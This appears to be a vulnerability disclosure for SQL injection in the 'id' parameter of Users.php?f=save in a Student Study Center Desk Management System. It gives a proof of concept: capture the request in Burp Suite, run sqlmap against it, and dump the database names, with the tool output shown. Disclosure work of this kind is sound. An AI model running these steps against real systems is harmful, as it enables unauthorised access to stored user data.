---
slug: student-study-center-desk-management-system-save_user
title: Student Study Center Desk Management System (Users.php?f=save)
---


## Details

### Related Code file: 
`/sscdms/classes/Users.php?f=save`

## Injection parameter: 
`MULTIPART id`


## POC

![1](https://github.com/user-attachments/assets/eaac28cf-fe44-49aa-8653-f5c3028a1b4d)

Intercept the request using Burpsuite Proxy.

![2](https://github.com/user-attachments/assets/97f01153-2711-4c2f-9658-759d2ff3636a)

Save request to `save_user.txt`.

### Verify vulnerability

```
sqlmap -r save_user.txt --batch
```

![53](https://github.com/user-attachments/assets/2701cd08-d5bc-4b64-9dfd-6b8dbf9586a2)

```
Parameter: MULTIPART id ((custom) POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: -----------------------------375499073526017961903522895095
Content-Disposition: form-data; name="id"
```


### Dump databases

```
sqlmap -r save_user.txt --batch --dbs
```

![54](https://github.com/user-attachments/assets/a2f89b5c-541b-40a4-b00d-daa4e40e5c73)

```
[10:46:50] [INFO] fetching database names
[10:46:50] [INFO] retrieved: 'information_schema'
[10:46:50] [INFO] retrieved: 'sscdms'
available databases [2]:
[*] information_schema
[*] sscdms
```